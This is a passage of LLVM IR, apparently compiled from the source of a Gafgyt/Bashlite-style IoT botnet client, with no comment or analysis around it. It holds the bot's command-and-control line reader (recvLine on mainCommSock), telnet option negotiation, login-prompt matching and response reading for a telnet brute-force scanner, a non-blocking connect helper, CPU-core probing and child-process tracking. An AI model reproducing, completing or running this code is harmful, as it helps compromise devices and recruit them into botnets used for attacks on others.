  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #5
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i64 0, i64 0), i32 0) #5
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #5
  %23 = call i32 @close(i32 %3) #5
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #5
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i64 0, i64 0), i32 0) #5
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #5
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #5, !srcloc !13
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #5
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #5
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #5
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #5, !srcloc !14
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #5
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #5
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #5
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #5
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #5
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #5
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #5
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #5
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #5
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #5, !srcloc !15
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #5
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #5
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #5
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #5
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #5
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #5
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #5
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #3

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
